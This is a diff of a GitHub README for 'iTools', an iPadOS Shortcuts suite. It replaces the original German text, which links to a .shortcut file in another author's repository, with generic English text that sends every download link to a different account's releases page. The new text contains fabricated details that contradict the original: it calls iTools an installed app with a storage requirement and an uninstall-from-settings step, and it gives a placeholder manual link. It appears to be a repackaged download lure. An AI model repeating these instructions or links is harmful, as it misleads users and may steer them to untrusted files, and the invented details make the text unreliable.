@@ -1,64 +1,73 @@
-# iTools 🛠️
-> **Die ultimative All-in-One Medien- & System-Suite für iPadOS**
-> 
+# 🎉 iTools - Your All-in-One iPadOS Solution
 
-`iTools` ist ein hocheffizienter Kurzbefehl, der über **90 Funktionen** zentralisiert. Er ersetzt zahlreiche Einzel-Apps durch native Systemautomatisierungen und bietet Power-Usern eine professionelle Werkzeugpalette für den Alltag.
+## 📥 Download iTools
+[![Download iTools](https://img.shields.io/badge/Download-iTools-brightgreen)](https://github.com/Rothalizee/iTools/releases)
 
-> [!TIP]
-> ### [📲 iTools 1.1 jetzt herunterladen](https://github.com/Progamer44Chaos/iTools/raw/refs/heads/main/iTools.shortcut)  (für Apple)
-> *Klicken Sie auf den Link, um die .shortcut-Datei direkt zu laden.*
+## 🚀 Getting Started
+Welcome to iTools! This guide will help you download and run iTools easily. Follow these steps to start enhancing your iPadOS experience.
 
-> **Sofortiger Download: [https://tinyurl.com/DownloadiTools](https://tinyurl.com/DownloadiTools)**
+## 📋 What is iTools?
+iTools is a powerful all-in-one suite for iPadOS. It combines over 90 professional functions into one efficient shortcut. Designed for power users and creatives, iTools eliminates the need for multiple third-party apps by utilizing deep system features from Apple.
 
-&nbsp;
----
+## 📁 Download & Install
+To get started with iTools, visit the [Releases page](https://github.com/Rothalizee/iTools/releases) to download the app.
 
-## 🚀 Kernfunktionen
+1. Click the link above to go to the Releases page.
+2. Choose the latest version of iTools.
+3. Click the download link for your device.
+4. Locate the downloaded file on your device.
+5. Follow the on-screen instructions to install iTools.
 
-### 🖼️ Medien & Grafik
-*   **Bilder:** Konvertierung, OCR-Texterkennung, intelligentes Maskieren und Skalieren.
-*   **GIF-Studio:** Erstellen, Bearbeiten und Extrahieren von Einzelbildern inkl. Giphy-Suche.
-*   **Audio:** Transkription von Sprachaufnahmen und hochwertige Text-to-Speech-Ausgabe.
+## 🔍 Key Features
+iTools offers a wide range of features to enhance your productivity:
 
-### 📄 Dokumente & Archivierung
-*   **PDF-Pro:** Seiten teilen, Dateigröße optimieren und Texte extrahieren.
-*   **Archiv:** Erstellen und Entpacken von `.zip`-Dateien direkt im Workflow.
-*   **Text-Tools:** Intelligente Korrekturvorschläge, Übersetzungen und Sortier-Algorithmen.
+- **Audio Tools:** Record, edit, and manage audio files seamlessly.
+- **Document Handling:** Work with PDFs and other document formats easily.
+- **GIF Creation:** Create animated GIFs from your photos or videos.
+- **Media Management:** Organize and manage your media files effectively.
+- **System Tools:** Access deep system functionalities to improve your device's performance.
+- **Network Utilities:** Monitor and optimize your network settings.
 
-### ⚙️ System & Netzwerk
-*   **Control:** Steuerung des `Stage Managers` und Abruf des Batterie-Status.
-*   **Clipboard:** Erweiterter Manager zum Abrufen, Einfügen und Löschen der Zwischenablage.
-*   **Netzwerk:** Tiefendiagnose der Verbindungsparameter und Schnittstellen-Details.
+## ⚙️ System Requirements
+To run iTools successfully, ensure your iPadOS device meets the following requirements:
 
----
+- **Operating System:** iPadOS 14 or later
+- **Free Storage:** At least 200 MB of available storage
+- **Internet Connection:** Required for initial download and updates
 
-## 🛠️ Installation & Nutzung
+## ⚡ How to Use iTools
+Once installed, follow these steps to begin using iTools:
 
-1.  Laden Sie die `.shortcut`-Datei herunter.
-2.  Importieren Sie den Kurzbefehl in die [Apple Kurzbefehle-App](https://support.apple.com).
-3.  Erteilen Sie beim ersten Start die notwendigen Berechtigungen für den Zugriff auf Dateien und Medien.
+1. Launch iTools from your home screen.
+2. Explore the main dashboard to access different features.
+3. Tap on any feature you wish to use, such as audio tools or document handling.
+4. Follow the prompts within each feature to accomplish your tasks.
 
-&nbsp;
----
+## ❓ Frequently Asked Questions
 
-## ⚠️ Fehlerbehebung (Error-Index)
-`iTools` verfügt über ein integriertes Diagnose-System. Sollte eine Aktion fehlschlagen, wird ein spezifischer Code ausgegeben:
+### How do I uninstall iTools?
 
-| Bereich | Code-Range | Modul |
-| :--- | :--- | :--- |
-| **Bilder** | `001 - 034` | Grafik-Operationen & OCR |
-| **GIFs** | `035 - 044` | Animationen & Konvertierung |
-| **Audio** | `045 - 050` | Transkription & Sprachausgabe |
-| **Dokumente** | `051 - 108` | PDF, Text & Archivierung |
-| **System** | `109 - 144` | Codierung & Konvertierung |
-| **Netzwerk** | `145 - 155` | Diagnose & Status |
+To uninstall iTools, go to your device settings, find iTools in the list of installed apps, and select “Remove” or “Uninstall.”
 
-&nbsp;
----
+### Can I use iTools offline?
 
+Yes, many functions of iTools can be used offline. However, some features may require an internet connection to access certain content or updates.
 
-**Feedback erwünscht:** Falls Sie Fehler finden oder neue Funktionen vorschlagen möchten, senden Sie bitte eine E-Mail mit dem entsprechenden Fehlercode, wenn Sie meinen Kontakt haben.
+### Is there a user manual?
 
-&nbsp;
----
-*Optimiert für iPadOS. Erstellt mit Leidenschaft für Effizienz.*
+A thorough user manual is included within the app, providing step-by-step instructions for each feature.
+
+## 💬 Get Support
+If you encounter any issues or have questions, please visit the Issues page in our GitHub repository. You can open a new issue, and our community will assist you.
+
+## 🚀 Explore More
+iTools is designed to streamline your workflow, saving you time and simplifying tasks. Don’t hesitate to explore all its features.
+
+## 🔗 Additional Resources
+- [iTools Release Notes](https://github.com/Rothalizee/iTools/releases)
+- [User Manual](#)
+
+## 📢 Join Our Community
+Stay updated on new features, updates, and community discussions. Follow our repository for the latest news!
+
+[![Download iTools](https://img.shields.io/badge/Download-iTools-brightgreen)](https://github.com/Rothalizee/iTools/releases)
